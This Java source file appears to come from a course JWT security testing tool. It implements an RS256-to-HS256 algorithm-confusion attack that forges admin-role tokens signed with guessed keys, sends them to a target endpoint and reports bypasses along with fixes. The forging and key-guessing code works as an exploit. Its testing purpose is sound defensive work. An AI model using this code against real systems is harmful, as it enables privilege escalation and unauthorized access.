package rs.raf.bvs.jwttool.attacks;

import org.json.JSONObject;
import rs.raf.bvs.jwttool.http.ApiClient;
import rs.raf.bvs.jwttool.jwt.JwtCodec;
import rs.raf.bvs.jwttool.jwt.JwtParts;

// RS256 vs HS256 algorithm confusion (CVE-2016-10555)
// If the verifier picks the algorithm from the "alg" header, the public RSA key can
// be used as the HMAC secret and the token signed with alg=HS256
// The target uses HS256, so we try several candidates as the key and see whether
// any passes a role=ADMIN escalation. We expect everything to be blocked
public final class A7_AlgorithmConfusion implements Attack {

    // Simulated RSA public key, in reality it would be public via JWKS
    private static final String FAKE_PEM_PUBLIC_KEY =
            "-----BEGIN PUBLIC KEY-----\n" +
            "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0Z3VS5JJcds3xfn/y0w0\n" +
            "tH+nE5sUDIO9C1JroKqkOuOZdLb9wq5fSAtCG8gZ7w0sIu1xZ8C3sN9V3qfH0o8w\n" +
            "fakefakefakefakefakefakefakefakefakefakefakefakefakefakefakefake\n" +
            "-----END PUBLIC KEY-----";

    @Override
    public AttackResult run(AttackContext ctx) throws Exception {
        AttackResult r = new AttackResult("Attack 7 - Algorithm Confusion (RS256 -> HS256)");

        if (ctx.getToken() == null) {
            r.fail("No token. Log in first.");
            return r;
        }

        JwtParts orig = JwtCodec.split(ctx.getToken());
        String origAlg = orig.header.optString("alg", "<none>");

        r.section("Attack context");
        r.info("Original alg in the token: " + origAlg);
        r.info("Scenario: we simulate a verifier that follows the 'alg' header instead of pinning it.");
        r.info("We forge tokens with alg=HS256 and different candidates as the HMAC secret.");

        if (ctx.getSecret() == null || ctx.getSecret().isEmpty()) {
            r.info("A3 was not run - the secret is not cracked, using hardcoded candidates.");
        } else {
            r.ok("A3 already cracked the secret: \"" + ctx.getSecret() + "\" - adding it to the candidate list.");
        }

        String path;
        if (ctx.getTestEndpoint() != null) {
            path = ctx.getTestEndpoint();
        } else {
            path = "/users";
        }

        // malicious payload with role=ADMIN, the same for all candidates
        JSONObject payload = new JSONObject(orig.payload.toString());
        payload.put("role", "ADMIN");
        String payloadB64 = JwtCodec.b64UrlEncode(payload.toString());

        // Header says HS256, a verifier that branches on 'alg' will try HMAC256
        JSONObject header = new JSONObject().put("alg", "HS256").put("typ", "JWT");
        String headerB64 = JwtCodec.b64UrlEncode(header.toString());

        // key candidates: PEM, "secret", empty string, the A3 secret if present
        String[] candidates = buildCandidates(ctx);

        r.section("Forge + dispatch for each candidate");
        boolean anyBypassed = false;
        for (int i = 0; i < candidates.length; i++) {
            String candidate = candidates[i];
            String label = describeCandidate(candidate);

            // HMAC SecretKeySpec throws IllegalArgumentException for an empty key
            // we skip such a candidate
            String signature;
            try {
                signature = JwtCodec.signHS256(headerB64, payloadB64, candidate);
            } catch (IllegalArgumentException ex) {
                r.info("candidate=" + label + " -> [INVALID_KEY] " + ex.getMessage());
                continue;
            }
            String forged = JwtCodec.assemble(headerB64, payloadB64, signature);

            ApiClient.HttpResult res = ctx.api().get(path, forged);

            String marker;
            if (res.status == 200) {
                marker = "[BYPASS]";
                anyBypassed = true;
            } else {
                marker = "[blocked]";
            }
            r.info("candidate=" + label + " -> HTTP " + res.status + "  " + marker);

            if (res.status == 200) {
                r.warn("BYPASS succeeded with candidate: " + label);
                r.code("Forged token", forged);
            }
        }

        r.section("Conclusion");
        if (anyBypassed) {
            r.warn("Server accepts an HS256 token signed with public-key material - CRITICAL VULNERABILITY.");
            r.setSuccess(false);
            r.setConclusion("The verifier does not pin the algorithm - the attacker can switch RS256 to HS256 and sign with the public key. Fix: require a specific algorithm explicitly in the verifier (e.g. Algorithm.HMAC256(secret) or Algorithm.RSA256(pub, null)) and reject everything else.");
        } else {
            r.ok("All variants rejected - the algorithm is probably pinned on the server side.");
            r.setSuccess(true);
            r.setConclusion("Defense works: the server accepts only the alg it chose itself, not what the header says. Best practice: JWT.require(Algorithm.HMAC256(secret)).build().verify(token).");
        }
        return r;
    }

    // list of candidate keys, the A3 secret goes first if present
    private static String[] buildCandidates(AttackContext ctx) {
        String fromCtx = ctx.getSecret();
        if (fromCtx != null && !fromCtx.isEmpty()) {
            return new String[] { fromCtx, FAKE_PEM_PUBLIC_KEY, "secret", "" };
        }
        return new String[] { FAKE_PEM_PUBLIC_KEY, "secret", "", "password" };
    }

    // shortened display of the candidate in the log because the PEM takes too much space
    private static String describeCandidate(String candidate) {
        if (candidate == null) return "(null)";
        if (candidate.isEmpty()) return "\"\" (empty)";
        if (candidate.startsWith("-----BEGIN")) return "<simulated RSA public key in PEM>";
        if (candidate.length() > 20) return "\"" + candidate.substring(0, 17) + "...\"";
        return "\"" + candidate + "\"";
    }
}
